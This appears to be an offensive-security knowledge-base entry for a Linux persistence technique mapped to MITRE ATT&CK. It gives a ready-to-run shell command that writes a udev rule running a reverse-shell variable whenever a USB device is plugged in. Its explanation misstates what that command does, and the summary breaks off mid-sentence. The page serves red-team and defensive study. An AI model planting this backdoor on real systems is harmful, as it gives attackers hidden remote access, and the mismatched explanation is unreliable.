---
id: 3f450700-511b-4ff4-b067-08b1a71334b2
name: Linux - Backdooring a VirtualBox Driver
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.096726+00:00'
updated_at: '2023-04-10T20:34:18.245528+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Kernel Modules and Extensions|T1215 - Kernel Modules and Extensions]]'
tags:
- '[[Backdooring a driver]]'
- '[[Linux - Persistence]]'
commands:
- '[[Add USB device to udev rules]]'
---

# Linux - Backdooring a VirtualBox Driver

## Summary

Backdooring a VirtualBox driver involves creating a udev rule that loads a malicious kernel module when the VirtualBox kernel driver is loaded. This allows an attacker to maintain persistence on the system even after a reboot. The technical process involves creating a new udev rule that specifies t

## Description

# Description

Backdooring a VirtualBox driver involves creating a udev rule that loads a malicious kernel module when the VirtualBox kernel driver is loaded. This allows an attacker to maintain persistence on the system even after a reboot. The technical process involves creating a new udev rule that specifies the malicious kernel module to be loaded when the VirtualBox kernel driver is loaded. This can be accomplished by modifying the '/etc/udev/rules.d/60-vboxdrv.rules' file. 

The business value of this attack is that it allows an attacker to maintain control of the system and potentially move laterally within the network. This can lead to data theft, intellectual property theft, and other types of cybercrime.

 

## Requirements

1. Root or administrator access to the target system

1. Ability to modify system files

1. Knowledge of the target system's kernel and drivers

 

## Defense

1. Monitor for modifications to system files, especially those related to kernel drivers

1. Disable unnecessary kernel modules and drivers to limit attack surface

1. Implement strong access controls to limit the ability of attackers to gain root or administrator access to systems

 

## Objectives

1. Maintain persistence on the compromised system

1. Allow for future access and control of the system

 

# Instructions

1. To create a udev rule for VirtualBox kernel drivers, run the following command:

 



**Code**: [[echo "ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_de]]



> This command creates a udev rule that will automatically load the VirtualBox kernel drivers when a USB device is added to the system. The rule is saved in the file /etc/udev/rules.d/71-vbox-kernel-drivers.rules. The command uses the `echo` command to write the rule to the file, and the `tee` command to also output the rule to the console. The `> /dev/null` at the end of the command redirects any output to the null device, so it is not displayed on the console.



**Command** ([[Add USB device to udev rules]]):

```bash
echo "ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```



## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Kernel Modules and Extensions|T1215 - Kernel Modules and Extensions]]

## Commands Used

- [[Add USB device to udev rules]]

## Tags

- [[Backdooring a driver]]
- [[Linux - Persistence]]


